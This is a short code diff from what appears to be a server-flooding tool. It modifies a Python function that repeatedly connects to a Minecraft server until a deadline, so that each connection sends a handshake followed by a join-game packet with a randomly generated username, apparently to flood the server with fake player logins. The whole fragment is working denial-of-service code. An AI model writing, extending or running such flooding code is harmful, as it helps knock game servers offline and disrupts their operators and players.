@@ -90,7 +90,8 @@ def minecraft(addr, proto, until):
     while until > time.time():
         sock = socket.socket()
         sock.connect((addr.split(":")[0], int(addr.split(":")[1])))
-        sock.send(handshake_packet(addr.split(":")[0], int(addr.split(":")[1]), int(proto), 2))
+        sock.send(handshake_packet(addr.split(":")[0], int(addr.split(":")[1]), int(proto), 2) +
+                  join_game_packet(randstr(random.randint(13, 16))))
         sock.close()
 
 
